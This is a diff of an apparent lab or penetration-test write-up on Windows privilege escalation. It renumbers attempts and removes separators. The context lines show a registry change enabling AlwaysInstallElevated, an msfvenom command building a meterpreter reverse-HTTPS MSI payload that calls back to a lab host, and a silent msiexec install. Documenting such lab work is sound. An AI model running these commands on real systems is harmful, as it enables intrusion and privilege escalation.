@@ -533,7 +533,7 @@ run
 ```
 **Result:** Module only supports x86 architecture. Target is x64. Incompatible architecture — module not applicable.
 
-### Attempt 7: AlwaysInstallElevated (Module)
+### Attempt 6: AlwaysInstallElevated (Module)
 Registry keys were configured to enable AlwaysInstallElevated:
 ```cmd
 reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
@@ -550,7 +550,7 @@ run
 ```
 **Result:** New session opened but returned `DESKTOP-H53BPAA\Apollo` on `getuid`. `getsystem` failed on resulting session.
 
-### Attempt 8: AlwaysInstallElevated (Manual MSI)
+### Attempt 7: AlwaysInstallElevated (Manual MSI)
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_https \
 LHOST=192.168.92.136 LPORT=16000 \
@@ -564,8 +564,6 @@ msiexec /quiet /qn /i C:\temp\evil.msi
 
 **Result:** New session opened but returned `DESKTOP-H53BPAA\Apollo`. MSI executed but Windows Installer did not elevate the installation to SYSTEM context despite AlwaysInstallElevated keys being set.
 
----
-
 ## Analysis of Failed Attempts
 
 The repeated failures across multiple vectors can be attributed to two root causes:
@@ -575,8 +573,6 @@ Unlike typical lab setups where the compromised user is in the local Administrat
 
 **2. Metasploit Module Implementation Gaps**
 CVE-2024-35250 was confirmed vulnerable by both the exploit suggester and the module's own autocheck, however the Metasploit implementation failed to complete the token elevation step consistently across multiple attempts. This reflects a known gap between vulnerability confirmation and reliable exploitation in framework implementations.
-
----
 
 ## Selected LPE Vector: Weak Service Binary Permissions (Intentional Misconfiguration)
 
